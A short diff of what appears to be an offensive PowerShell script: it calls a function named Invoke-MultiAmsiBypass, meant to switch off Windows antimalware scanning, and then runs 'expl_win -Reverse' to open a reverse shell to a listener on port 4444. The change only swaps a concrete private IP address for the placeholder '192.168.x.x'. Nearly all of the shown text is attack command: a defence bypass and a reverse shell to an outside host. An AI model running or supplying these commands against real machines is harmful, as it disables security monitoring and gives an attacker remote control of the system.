@@ -152,4 +152,4 @@ function Invoke-MultiAmsiBypass
 }
 
 Invoke-MultiAmsiBypass
-expl_win -Reverse -IPAddress 192.168.9.5 -Port 4444
+expl_win -Reverse -IPAddress 192.168.x.x -Port 4444
